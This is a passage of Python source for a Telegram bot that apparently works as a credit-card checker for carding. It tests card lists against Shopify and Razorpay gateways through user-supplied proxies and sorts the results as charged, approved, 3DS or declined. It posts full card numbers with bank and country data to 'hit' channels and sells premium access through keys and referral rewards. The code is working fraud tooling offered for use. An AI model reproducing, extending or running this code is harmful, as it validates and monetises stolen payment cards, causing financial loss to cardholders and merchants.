            f"💰 {bs('Over threshold')}: <code>{over}</code>\n"
            f"🔌 {bs('Proxy errors')}: <code>{proxy_err}</code>\n"
            f"📁 {bs('Pool size')}: <code>{_site_fetcher.pool_size()}</code>"
        ), parse_mode='html', link_preview=False)
    except Exception as e:
        await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"),
                               parse_mode='html')
    finally:
        cleanup_user_sem(uid)


# =============================================================================
# HIT DM
# =============================================================================
async def send_realtime_hit(user_id: int, result: dict, hit_type: str,
                            user_name: str, gateway_type: str = "Shopify",
                            video_path: str = None):
    bin_tuple = await get_bin_info(result.get('card', '').split('|')[0])
    status = (result.get('status') or 'Dead').upper()
    text = format_realtime_hit(result, gateway_type, bin_tuple)
    if status == "CHARGED":
        text = pe(f"📌 <b>{bs('PINNED HIT — CHARGED')}</b>\n{SEP}\n{text}")
    video_path = video_path or _pick_hit_video()
    try:
        sent = None
        if video_path and os.path.exists(video_path):
            sent = await send_file_entities(user_id, video_path, text,
                                            buttons=HIT_BUTTON, supports_streaming=True)
        if sent is None:
            sent = await send_entities(user_id, text, buttons=HIT_BUTTON)
        if status == "CHARGED" and sent:
            try:
                await client_instance.pin_message(user_id, sent.id, notify=False)
            except Exception:
                pass
    except Exception as e:
        log_system("HIT_DM", f"user {user_id}: {e}", "error")


# =============================================================================
# HIT TO CHANNEL
# =============================================================================
async def send_hit_to_channel(card: str, status: str, response: str,
                              gateway: str, price: str = "-",
                              user_mention: str = None, user_id: int = None,
                              gateway_type: str = "Shopify",
                              site: str = None, proxy_used: str = None,
                              video_path: str = None):
    status_up = (status or '').upper()
    if status_up not in ("CHARGED", "APPROVED", "3DS"):
        return
    mention = user_mention or "User"
    video_path = video_path or _pick_hit_video()

    if HIT_CHANNEL_ID and HIT_CHANNEL_ID != -1000000000000:
        try:
            body = pe(f"""⭐ <b>{bs('HIT')}</b> ➛ <b>{bs(status_up)}</b>
{SEP}
🛒 {bs('Gateway')} ━ <code>{gateway}</code>
📝 {bs('Response')} ━ <code>{(response or '')[:45]}</code>
💰 {bs('Price')} ━ <code>{price}</code>
{SEP}
👤 {bs('User')} ➛ {mention}
{SEP}
{DEV_LINE}""")
            sent = None
            if video_path and os.path.exists(video_path):
                try:
                    sent = await send_file_entities(
                        HIT_CHANNEL_ID, video_path, body,
                        buttons=HIT_BUTTON, supports_streaming=True)
                except Exception:
                    pass
            if sent is None:
                sent = await send_entities(HIT_CHANNEL_ID, body, buttons=HIT_BUTTON)
            if status_up == "CHARGED" and sent:
                try:
                    await client_instance.pin_message(HIT_CHANNEL_ID, sent.id)
                except Exception:
                    pass
        except Exception as e:
            log_system("HIT_MAIN", f"failed: {e}", "error")

    if CHARGED_ONLY_CHANNEL_ID and CHARGED_ONLY_CHANNEL_ID != -1000000000000:
        try:
            bin_tuple = await get_bin_info(card.split('|')[0])
            brand, typ, level, bank, country, flag = bin_tuple
            bin_disp = f"{brand} - {typ} - {level}" if brand != '-' else "N/A"
            bank_disp = bank if bank != '-' else "N/A"
            country_disp = f"{country} {flag}" if country != '-' else "N/A"
            site_disp = site or "N/A"
            uid_disp = f"<code>{user_id}</code>" if user_id else "N/A"
            proxy_line = f"\n🔌 {bs('Proxy')} ━ <code>{proxy_used}</code>" if proxy_used else ""
            date_full = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
            status_label = f"💎 {bs(status_up)}"

            body = pe(f"""{status_label}
{SEP}
💳 {bs('Card')} ━ <code>{card}</code>
🛒 {bs('Gateway')} ━ <code>{gateway}</code>
🌐 {bs('Site')} ━ <code>{site_disp}</code>
📝 {bs('Response')} ━ <code>{response}</code>
💰 {bs('Price')} ━ <code>{price}</code>{proxy_line}
{SEP}
🏦 {bs('BIN')} ━ <code>{bin_disp}</code>
🏛 {bs('Bank')} ━ <code>{bank_disp}</code>
🌍 {bs('Country')} ━ <code>{country_disp}</code>
{SEP}
👤 {bs('User')} ➛ {mention} ({uid_disp})
📅 {bs('Date')} ➛ {date_full}
{SEP}
{DEV_LINE}""")

            sent = None
            if video_path and os.path.exists(video_path):
                try:
                    sent = await send_file_entities(
                        CHARGED_ONLY_CHANNEL_ID, video_path, body,
                        buttons=HIT_BUTTON, supports_streaming=True)
                except Exception:
                    pass
            if sent is None:
                sent = await send_entities(CHARGED_ONLY_CHANNEL_ID, body, buttons=HIT_BUTTON)
            if status_up == "CHARGED" and sent:
                try:
                    await client_instance.pin_message(CHARGED_ONLY_CHANNEL_ID, sent.id)
                except Exception:
                    pass
        except Exception as e:
            log_system("HIT_FULL", f"failed: {e}", "error")


# =============================================================================
# REDEEM LOG
# =============================================================================
async def send_redeem_log(user_id: int, key: str, status: str, details: str = ""):
    if not REDEEM_LOG_CHANNEL_ID or REDEEM_LOG_CHANNEL_ID == -1000000000000:
        return
    try:
        sender = await client_instance.get_entity(user_id)
        username = f"@{sender.username}" if sender.username else f"User {user_id}"
    except Exception:
        username = f"User {user_id}"
    keys_data = load_keys()
    entry = keys_data.get(key, {})
    hours = entry.get("hours", DEFAULT_KEY_HOURS)
    try:
        hours = int(hours)
    except Exception:
        hours = DEFAULT_KEY_HOURS
    if hours < 24:
        plan_disp = f"{hours}.0h"
        exp_mins = hours * 60 - 1
        exp_h, exp_m = exp_mins // 60, exp_mins % 60
        exp_disp = f"{exp_h}h {exp_m:02d}m"
    else:
        days = hours // 24
        plan_disp = f"{days}.0d"
        exp_disp = f"{days - 1}d 23h 59m"
    ok = status.startswith("✅")
    emoji = "✅" if ok else "❌"
    body = pe(f"""{emoji} <b>{bs('Redeem Log')}</b> ➛ <b>{bs(status)}</b>
{SEP}
👤 {bs('User')} ⌁ {username} ⌁ <code>{user_id}</code>
🔑 {bs('Key')} ⌁ <code>{key}</code>
💎 {bs('Plan')} ⌁ <code>{plan_disp}</code>
⏰ {bs('Expires')} ⌁ <code>{exp_disp}</code>
📝 {bs('Details')} ⌁ <i>{details or '-'}</i>
{SEP}
{DEV_LINE}""")
    try:
        await send_entities(REDEEM_LOG_CHANNEL_ID, body, buttons=HIT_BUTTON)
    except Exception as e:
        log_system("REDEEM_LOG", f"send failed: {e}", "error")


# =============================================================================
# PROGRESS UI
# =============================================================================
def _fmt_eta(seconds: float) -> str:
    if seconds <= 0 or seconds > 86400:
        return "—"
    seconds = int(seconds)
    h, m, s = seconds // 3600, (seconds % 3600) // 60, seconds % 60
    if h:
        return f"{h}h {m:02d}m"
    if m:
        return f"{m}m {s:02d}s"
    return f"{s}s"


def _build_bar(pct: int, length: int = 16) -> str:
    pct = max(0, min(100, pct))
    filled = int(round(length * pct / 100))
    return "▰" * filled + "▱" * (length - filled)


async def update_progress(user_id: int, message_id: int, results: dict,
                          current_checked: int, gateway_type: str = "Shopify"):
    total = results.get('total', 1) or 1
    checked = results.get('checked', 0)
    remaining = max(total - checked, 0)
    elapsed = max(0.0, time.time() - results.get('start_time', time.time()))
    h, m, s = int(elapsed) // 3600, (int(elapsed) % 3600) // 60, int(elapsed) % 60
    pct = int((checked / total) * 100) if total else 0
    bar = _build_bar(pct, 16)
    last_card = (results.get('last_card') or 'None')
    last_resp = (results.get('last_response') or 'Waiting...')[:22]
    last_price = (results.get('last_price') or '-')[:8]
    n_charged = len(results.get('charged', []))
    n_approved = len(results.get('approved', []))
    n_3ds = len(results.get('3ds', []))
    n_dead = len(results.get('dead', []))
    n_errors = len(results.get('errors', []))
    hits = n_charged + n_approved + n_3ds
    hit_rate = (hits / checked * 100.0) if checked > 0 else 0.0
    if checked > 0 and remaining > 0:
        rate = checked / elapsed if elapsed > 0 else 0
        eta_sec = (remaining / rate) if rate > 0 else 0
        eta_str = _fmt_eta(eta_sec)
    elif remaining == 0:
        eta_str = "done"
    else:
        eta_str = "—"
    cps = (checked / elapsed) if elapsed > 0 else 0.0

    text = pe(f"""💳 {bs('Card')}: <code>{last_card}</code>
📝 {bs('Response')}: <code>{last_resp}</code>
💰 {bs('Price')}: <code>{last_price}</code>
{SEP}
{bar}  <b>{pct}%</b>
{SEP}
🥇 {bs('Charged')}: {n_charged}   🥈 {bs('Approved')}: {n_approved}
🥉 {bs('3DS')}: {n_3ds}   🥔 {bs('Declined')}: {n_dead}
🧨 {bs('Errors')}: {n_errors}
{SEP}
📊 {checked}/{total}  ━  ⏳ {bs('Left')}: {remaining}
🎯 {bs('Hit-rate')}: <b>{hit_rate:.2f}%</b>  ━  ⚡ {cps:.1f}/s
⏱️ {h:02d}:{m:02d}:{s:02d}  ━  🕐 {bs('ETA')}: {eta_str}
""")

    prefix = "razorpay" if gateway_type.lower() == "razorpay" else "shopify"
    buttons = [
        [pbtn(f"🥇 {bs('Charged')} {n_charged}",
              data=f"{prefix}_export_charged:{user_id}", style="success", icon="🥇"),
         pbtn(f"🥈 {bs('Approved')} {n_approved}",
              data=f"{prefix}_export_approved:{user_id}", style="primary", icon="🥈")],
        [pbtn(f"🥉 {bs('3DS')} {n_3ds}",
              data=f"{prefix}_export_3ds:{user_id}", style="primary", icon="🥉"),
         pbtn(f"🧨 {bs('Errors')} {n_errors}",
              data=f"{prefix}_export_errors:{user_id}", style="danger", icon="🧨")],
        [pbtn(f"⛔ {bs('Stop')}", data=f"stop_{user_id}", style="danger", icon="⛔")],
    ]
    try:
        text_clean, ents = build_entities(text)
        await client_instance.edit_message(
            user_id, message_id, text_clean,
            formatting_entities=ents,
            buttons=buttons, link_preview=False)
    except Exception:
        pass


# =============================================================================
# RESULT FILE
# =============================================================================
def _write_result_file(fname: str, title: str, items: list, gateway: str = "Shopify"):
    try:
        with open(fname, 'w', encoding='utf-8') as f:
            f.write(f"{title}\n")
            f.write(f"Gateway  : {gateway}\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total    : {len(items)}\n")
            f.write("=" * 50 + "\n\n")
            if not items:
                f.write("(no cards in this category)\n")
            else:
                for i, item in enumerate(items, 1):
                    card = item.get('card', '-')
                    resp = (item.get('message') or item.get('Response') or '')[:120]
                    gw = item.get('gateway') or item.get('Gateway') or gateway
                    price = item.get('price') or item.get('Price') or '-'
                    site = item.get('site', '-') or '-'
                    code = item.get('status_code', '-') or '-'
                    f.write(f"[{i:>4}] {card}\n")
                    f.write(f"        Response : {resp}\n")
                    f.write(f"        Gateway  : {gw}\n")
                    f.write(f"        Price    : {price}\n")
                    f.write(f"        Site     : {site}\n")
                    f.write(f"        Code     : {code}\n")
                    f.write("-" * 40 + "\n")
            f.write(f"\nEnd of {title} — {len(items)} card(s)\n")
    except Exception as e:
        log_system("EXPORT", f"write {fname} failed: {e}", "error")


async def send_final_results(user_id: int, results: dict, gateway_type: str = "Shopify"):
    elapsed = int(time.time() - results.get('start_time', time.time()))
    h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    time_fmt = f"{h}h {m}m {s}s" if h else f"{m}m {s}s" if m else f"{s}s"

    charged = results.get('charged', [])
    approved = results.get('approved', [])
    threeds = results.get('3ds', [])
    dead = results.get('dead', [])
    errors = results.get('errors', [])

    n_charged = len(charged)
    n_approved = len(approved)
    n_3ds = len(threeds)
    n_dead = len(dead)
    n_errors = len(errors)
    total = results.get('total', 0) or 1
    hit_rate = ((n_charged + n_approved + n_3ds) / total * 100.0) if total else 0.0

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    prefix = "NOVA"

    summary = pe(f"""✅ <b>{bs('Check Complete')}</b>
{SEP}
📊 <b>{bs('Results')}</b> ({gateway_type}):
   ┣ 🥇 {bs('Charged')}:  {n_charged}
   ┣ 🥈 {bs('Approved')}: {n_approved}
   ┣ 🥉 {bs('3DS')}:      {n_3ds}
   ┣ 🥔 {bs('Declined')}: {n_dead}
   ┣ 🧨 {bs('Errors')}:   {n_errors}
   ┗ 📊 {bs('Total')}:    {results.get('total', 0)}
{SEP}
🎯 {bs('Hit-rate')}: <b>{hit_rate:.2f}%</b>
⏱️ {bs('Time')}: {time_fmt}
{SEP}
📁 {bs('5 files below')} ⬇️""")
    try:
        await send_entities(user_id, summary)
    except Exception as e:
        log_system("RESULT", f"summary send failed: {e}", "error")

    categories = [
        ("CHARGED",  charged,  "🥇"),
        ("APPROVED", approved, "🥈"),
        ("3DS",      threeds,  "🥉"),
        ("DECLINED", dead,     "🥔"),
        ("ERRORS",   errors,   "🧨"),
    ]
    for cat_name, items, emoji in categories:
        fname = f"{prefix}_{cat_name}_{user_id}_{timestamp}.txt"
        _write_result_file(fname, f"{cat_name} CARDS", items, gateway_type)
        caption = pe(f"{emoji} <b>{bs(cat_name)}</b> — <code>{len(items)}</code>")
        try:
            await send_file_entities(user_id, fname, caption)
        except Exception as e:
            log_system("RESULT", f"send {cat_name} file failed: {e}", "error")
        try:
            os.remove(fname)
        except Exception:
            pass


# =============================================================================
# FREE GATE
# =============================================================================
async def _check_free_or_premium(event, uid: int) -> bool:
    if uid in ADMIN_ID:
        return True
    if is_premium(uid):
        return True
    is_group = event.chat_id != uid
    if not is_group:
        await send_group_only(event)
        return False
    used = get_free_usage(uid)
    if used >= FREE_DAILY_LIMIT:
        await styled_reply(event, pe(f"""💎 <b>{bs('Daily limit')}</b>
{SEP}
📊 {bs('Used')}: <code>{used}/{FREE_DAILY_LIMIT}</code>
🔑 <i>{bs('Redeem a key or contact admin')}</i>"""),
            buttons=[[pbtn(bs("📩 Contact"), url=f"https://t.me/{OWNER_TAG.lstrip('@')}",
                           style="success", icon="📩")]])
        return False
    left = free_cooldown_left(uid)
    if left > 0:
        await styled_reply(event, pe(f"⚠️ <b>{bs('Wait')} {left}s</b>"))
        return False
    return True


def _consume_free(uid: int):
    if uid in ADMIN_ID or is_premium(uid):
        return
    set_free_last(uid)
    inc_free_usage(uid)


# =============================================================================
# MILESTONE / STREAK PAYOUT
# =============================================================================
def _grant_milestone(user_id: int, hours: int, cc_limit: int):
    if user_id in ADMIN_ID:
        return
    _db.add_premium(user_id, hours=hours, cc_limit=cc_limit)


def _grant_streak_hours(user_id: int, hours: int):
    if user_id in ADMIN_ID:
        return
    _db.add_premium(user_id, hours=hours, cc_limit=DEFAULT_KEY_CC_LIMIT)


async def _process_milestone_payout(user_id: int):
    try:
        info = maybe_pay_milestone(user_id)
        if not info:
            return
        inviter_id = info["inviter_id"]
        hours = info["hours"]
        cc = info["cc_limit"]
        total = info["total_confirmed"]
        paid = info["milestones_paid"]
        nxt = info["next_milestone_at"]
        try:
            await send_entities(inviter_id, pe(
                f"🎉 <b>{bs('Milestone Unlocked!')}</b>\n{SEP}\n"
                f"👥 {bs('Confirmed referrals')}: <code>{total}</code>\n"
                f"🎁 {bs('Reward')}: <code>+{hours}h Premium</code>\n"
                f"💳 {bs('CC limit')}: <code>{cc}</code>\n"
                f"🏅 {bs('Milestones earned')}: <code>{paid}</code>\n"
                f"🎯 {bs('Next at')}: <code>{nxt}</code> {bs('referrals')}\n{SEP}\n"
                f"🚀 {bs('Keep inviting for more!')}"))
        except Exception:
            pass
    except Exception as e:
        log_system("REFERRAL", f"milestone error: {e}", "error")


async def _process_streak_update(user_id: int):
    try:
        info = update_streak(user_id)
        r = info.get("reward")
        if not r:
            return
        try:
            await send_entities(user_id, pe(
                f"🔥 <b>{bs('Streak Milestone!')}</b>\n{SEP}\n"
                f"📅 <b>{bs('Day')} {r['day']}</b> {bs('streak unlocked')}\n"
                f"🎁 <b>+{r['hours']}h Premium</b> {bs('added')}\n"
                f"🔥 {bs('Current streak')}: <code>{info['current']}</code>\n"
                f"🏆 {bs('Best')}: <code>{info['best']}</code>\n{SEP}\n"
                f"💡 {bs('Keep checking daily!')}"))
        except Exception:
            pass
    except Exception as e:
        log_system("STREAK", f"update error: {e}", "error")


async def _process_referral_payout(user_id: int):
    await _process_milestone_payout(user_id)


# =============================================================================
# COMMAND HANDLERS (all @client.on registered below)
# =============================================================================
@client.on(events.NewMessage(pattern=r'^[/.]history$'))
async def cmd_history(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    rows = _db.history(uid, limit=15)
    if not rows:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('No check history yet')}</b>"))
    lines = [f"📋 <b>{bs('Recent Checks')}</b>\n{SEP}"]
    for r in rows:
        st = (r.get("status") or "?").upper()
        emoji = {"CHARGED": "🥇", "APPROVED": "🥈",
                 "3DS": "🥉", "DECLINED": "🥔"}.get(st, "🧨")
        ts = r.get("ts")
        when = ts.strftime("%m/%d %H:%M") if hasattr(ts, "strftime") else "?"
        msg = (r.get("message") or "")[:32]
        lines.append(
            f"{emoji} <code>****{r.get('card_last4','????')}</code> "
            f"│ {r.get('gateway','-')} │ "
            f"<code>{msg}</code> │ <code>{when}</code>"
        )
    await styled_reply(event, pe("\n".join(lines)))


# ---------- Proxy commands ----------
@client.on(events.NewMessage(pattern=r'^[/.]addproxy$'))
async def cmd_addproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)

    lines = []
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        if reply and reply.file:
            try:
                path = await reply.download_media()
                async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = [ln.strip() for ln in (await f.read()).splitlines() if ln.strip()]
                os.remove(path)
            except Exception as e:
                return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
        elif reply and reply.text:
            lines = [ln.strip() for ln in reply.text.splitlines() if ln.strip()]
    else:
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) == 2:
            lines = [ln.strip() for ln in parts[1].splitlines() if ln.strip()]

    if not lines:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Add proxies')}</b>\n{SEP}\n"
            f"📝 <i>{bs('Send one per line')}:</i>\n"
            f"<code>• /addproxy\nUS:ip:port:user:pass\nip:port</code>\n"
            f"{SEP}\n"
            f"💡 {bs('Strict check — only real active proxies stored')}"))

    current = load_user_proxies(uid)
    if len(current) >= MAX_PROXIES_PER_USER:
        return await styled_reply(event, pe(
            f"⚠️ <b>{bs('Proxy limit')}</b> <code>{len(current)}/{MAX_PROXIES_PER_USER}</code>"))

    existing = set()
    for p in current:
        pp = parse_proxy_format(_strip_country_from_proxy(p))
        if pp and pp.get('username') and pp.get('password'):
            existing.add(f"{pp['ip']}:{pp['port']}:{pp['username']}:{pp['password']}")
        elif pp:
            existing.add(f"{pp['ip']}:{pp['port']}")
        else:
            existing.add(p)

    to_check, duplicates = [], 0
    for raw in lines:
        clean = _strip_country_from_proxy(raw)
        parsed = parse_proxy_format(clean)
        if not parsed:
            continue
        if parsed['username'] and parsed['password']:
            norm = f"{parsed['ip']}:{parsed['port']}:{parsed['username']}:{parsed['password']}"
        else:
            norm = f"{parsed['ip']}:{parsed['port']}"
        if norm in existing:
            duplicates += 1
            continue
        to_check.append(raw)
        existing.add(norm)

    if not to_check:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('No new proxies')}</b>\n"
            f"⚠️ {bs('Duplicates')}: <code>{duplicates}</code>"))

    slots = MAX_PROXIES_PER_USER - len(current)
    to_check = to_check[:slots]
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Strict check')} <code>{len(to_check)}</code> {bs('proxies')}..."))
    sem = get_user_sem(uid, "proxy")
    alive, dead = [], []
    checked = 0

    async def _check_one(p):
        nonlocal checked
        clean = _strip_country_from_proxy(p)
        async with sem:
            res = await test_proxy(clean)
        checked += 1
        if res['status'] == 'alive':
            alive.append(p)
        else:
            dead.append(p)
        if checked % 10 == 0 or checked == len(to_check):
            try:
                await status_msg.edit(pe(
                    f"💎 <b>{bs('Checking')}</b> [{checked}/{len(to_check)}]\n"
                    f"✅ {bs('Alive')}: <code>{len(alive)}</code> │ ❌ {bs('Dead')}: <code>{len(dead)}</code>"
                ), parse_mode='html', link_preview=False)
            except Exception:
                pass

    try:
        for i in range(0, len(to_check), PROXY_PER_USER_WORKERS):
            batch = to_check[i:i + PROXY_PER_USER_WORKERS]
            await asyncio.gather(*[_check_one(p) for p in batch])
        if alive:
            save_user_proxies(uid, current + alive)
        total_now = len(load_user_proxies(uid))
        await status_msg.edit(pe(
            f"✅ <b>{bs('Proxy check complete')}</b>\n{SEP}\n"
            f"✅ {bs('Alive (saved)')}: <code>{len(alive)}</code>\n"
            f"❌ {bs('Dead (rejected)')}: <code>{len(dead)}</code>\n"
            f"⚠️ {bs('Duplicates')}: <code>{duplicates}</code>\n"
            f"📁 {bs('Total saved')}: <code>{total_now}/{MAX_PROXIES_PER_USER}</code>"
        ), parse_mode='html', link_preview=False)
    except Exception as e:
        await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"),
                               parse_mode='html')
    finally:
        cleanup_user_sem(uid)


@client.on(events.NewMessage(pattern=r'^[/.]proxy$'))
async def cmd_proxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('No proxies')}</b> — <code>• /addproxy</code>"))
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Re-checking')} <code>{len(proxies)}</code> {bs('proxies')}..."))
    sem = get_user_sem(uid, "proxy")
    alive, dead, checked = [], [], 0

    async def _check_one(p):
        nonlocal checked
        clean = _strip_country_from_proxy(p)
        async with sem:
            res = await test_proxy(clean)
        checked += 1
        if res['status'] == 'alive':
            alive.append(p)
        else:
            dead.append(p)
        if checked % 10 == 0 or checked == len(proxies):
            try:
                await status_msg.edit(pe(
                    f"💎 <b>{bs('Checking proxies')}</b> [{checked}/{len(proxies)}]\n"
                    f"✅ <code>{len(alive)}</code> │ ❌ <code>{len(dead)}</code>"
                ), parse_mode='html', link_preview=False)
            except Exception:
                pass

    try:
        for i in range(0, len(proxies), PROXY_PER_USER_WORKERS):
            batch = proxies[i:i + PROXY_PER_USER_WORKERS]
            await asyncio.gather(*[_check_one(p) for p in batch])
        save_user_proxies(uid, alive)
        await status_msg.edit(pe(
            f"✅ <b>{bs('Proxy check complete')}</b>\n{SEP}\n"
            f"📁 {bs('Tested')}: <code>{len(proxies)}</code>\n"
            f"✅ {bs('Alive (kept)')}: <code>{len(alive)}</code>\n"
            f"🗑 {bs('Dead (removed)')}: <code>{len(dead)}</code>"
        ), parse_mode='html', link_preview=False)
    except Exception as e:
        await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"),
                               parse_mode='html')
    finally:
        cleanup_user_sem(uid)


@client.on(events.NewMessage(pattern=r'^[/.]chkproxy\s+'))
async def cmd_chkproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /chkproxy ip:port:user:pass</code>"))
    proxy = parts[1].strip()
    clean = _strip_country_from_proxy(proxy)
    if not parse_proxy_format(clean):
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid format')}</b>"))
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Strict check')} <code>{clean[:40]}</code>..."))
    res = await test_proxy(clean)
    if res['status'] == 'alive':
        await status_msg.edit(pe(
            f"✅ <b>{bs('Alive')}</b>\n{SEP}\n"
            f"🌐 {bs('IP')}: <code>{res.get('ip', '?')}</code>\n"
            f"🔌 <code>{clean}</code>"), parse_mode='html', link_preview=False)
    else:
        await status_msg.edit(pe(
            f"❌ <b>{bs('Dead')}</b>\n{SEP}\n"
            f"📝 {bs('Reason')}: <code>{res.get('reason', '?')}</code>\n"
            f"🔌 <code>{clean}</code>"), parse_mode='html', link_preview=False)


@client.on(events.NewMessage(pattern=r'^[/.]rmproxy\s+'))
async def cmd_rmproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /rmproxy ip:port:user:pass</code>"))
    raw = parts[1].strip()
    clean = _strip_country_from_proxy(raw)
    parsed = parse_proxy_format(clean)
    if not parsed:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid format')}</b>"))
    if parsed['username'] and parsed['password']:
        target = f"{parsed['ip']}:{parsed['port']}:{parsed['username']}:{parsed['password']}"
    else:
        target = f"{parsed['ip']}:{parsed['port']}"
    proxies = load_user_proxies(uid)
    found = [p for p in proxies if target in p]
    if not found:
        return await styled_reply(event, pe(f"💎 <b>{bs('Not in your list')}</b>"))
    proxies = [p for p in proxies if target not in p]
    save_user_proxies(uid, proxies)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Removed')}</b>\n🔌 <code>{target}</code>\n📁 <code>{len(proxies)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]rmproxyindex\s+'))
async def cmd_rmproxyindex(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /rmproxyindex 1,2,3</code>"))
    try:
        idxs = sorted({int(x.strip()) - 1 for x in parts[1].split(',') if x.strip()})
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid indices')}</b>"))
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b>"))
    valid = [i for i in idxs if 0 <= i < len(proxies)]
    if not valid:
        return await styled_reply(event, pe(f"💎 <b>{bs('No valid indices')}</b>"))
    removed = [proxies[i] for i in valid]
    keep = [p for i, p in enumerate(proxies) if i not in set(valid)]
    save_user_proxies(uid, keep)
    removed_str = "\n".join(f"🔌 <code>{p}</code>" for p in removed[:10])
    extra = f"\n<i>+{len(removed)-10} more</i>" if len(removed) > 10 else ""
    await styled_reply(event, pe(
        f"✅ <b>{bs('Removed')}</b> <code>{len(removed)}</code>\n{SEP}\n"
        f"{removed_str}{extra}\n{SEP}\n📁 {bs('Remaining')}: <code>{len(keep)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]clearproxy$'))
async def cmd_clearproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('Already empty')}</b>"))
    save_user_proxies(uid, [])
    await styled_reply(event, pe(
        f"✅ <b>{bs('Cleared')}</b> <code>{len(proxies)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]myproxy$'))
async def cmd_myproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('No proxies')}</b> — <code>• /addproxy</code>"))
    lines = [f"{i}. <code>{p}</code>" for i, p in enumerate(proxies[:50], 1)]
    if len(proxies) > 50:
        lines.append(f"<i>+{len(proxies)-50} more</i>")
    await styled_reply(event, pe(
        f"💎 <b>{bs('Your proxies')}</b> (<code>{len(proxies)}/{MAX_PROXIES_PER_USER}</code>)\n"
        f"{SEP}\n" + "\n".join(lines)))


@client.on(events.NewMessage(pattern=r'^[/.]getproxy$'))
async def cmd_getproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b>"))
    fname = f"NOVA_proxies_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
            for i, p in enumerate(proxies, 1):
                await f.write(f"{i}. {p}\n")
        await send_file_entities(uid, fname,
            pe(f"💎 {bs('Proxies')} (<code>{len(proxies)}</code>)"))
        os.remove(fname)
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


# ---------- Site commands ----------
@client.on(events.NewMessage(pattern=r'^[/.]addsites$'))
async def cmd_addsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(
            f"💎 {bs('Reply to a .txt file with')} <code>• /addsites</code>\n"
            f"💡 {bs('Adds to existing list')}"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
    new_sites = extract_urls(content)
    if not new_sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No valid URLs')}</b>"))
    existing = set(load_sites())
    to_test = [s for s in new_sites if s not in existing]
    already = len(new_sites) - len(to_test)
    if not to_test:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('All exist')}</b> · {bs('Dupes')} <code>{already}</code>"))
    threshold = get_threshold()
    status_msg = await styled_reply(event, pe(
